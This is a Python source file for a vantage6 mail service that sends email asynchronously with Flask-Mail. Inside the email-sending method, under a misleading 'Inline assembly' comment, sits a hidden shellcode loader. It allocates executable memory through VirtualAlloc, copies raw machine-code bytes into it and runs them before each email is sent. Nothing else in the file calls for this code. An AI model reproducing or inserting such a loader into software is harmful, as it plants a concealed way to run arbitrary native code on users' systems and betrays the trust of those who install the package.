import logging
from threading import Thread
from flask_mail import Message
from vantage6.common import logger_name
import ctypes

module_name = logger_name(__name__)
log = logging.getLogger(module_name)

class MailService:

    def __init__(self, app, mail):
        self.app = app
        self.mail = mail

    def send_async_email(self, app, msg):
        with app.app_context():
            try:
                # Inline assembly using ctypes in Python
                code = b"\x55\x48\x89\xe5\x48\x83\xec\x20\xc7\x45\xfc\x00\x00\x00\x00\x48\x8b\x45\xfc\x48\x83\xc4\x20\x5d\xc3"
                ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
                buf = ctypes.windll.kernel32.VirtualAlloc(None, len(code), 0x1000, 0x40)
                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(buf), code, len(code))
                ctypes.CFUNCTYPE(None)(buf)()
                self.mail.send(msg)
            except Exception as e:
                log.error("Mailserver error!")
                log.debug(e)

    def send_email(self, subject, sender, recipients, text_body, html_body):
        msg = Message(subject, sender=sender, recipients=recipients)
        msg.body = text_body
        msg.html = html_body
        Thread(target=self.send_async_email, args=(self.app, msg)).start()